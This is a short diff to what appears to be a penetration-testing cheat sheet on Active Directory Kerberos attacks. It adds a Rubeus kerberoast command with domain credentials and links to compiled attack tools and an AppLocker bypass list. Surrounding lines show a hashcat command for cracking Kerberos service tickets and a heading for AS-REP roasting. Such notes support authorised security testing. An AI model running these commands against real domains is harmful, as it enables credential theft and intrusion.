@@ -324,7 +324,10 @@ hashcat -m 13100 -a 0 hash_spn.txt /usr/share/wordlists/rockyou.txt --show --for
 ```Shell
 # Rubeus
 https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
-```Shell
+
+https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
+C:\> Rubeus.exe kerberoast /creduser:yuncorp.local\jenriquez /credpassword:<pass>
+```
 
 ##### ASPREPRoast Attack - Get tickets without pwd
 ```Shell
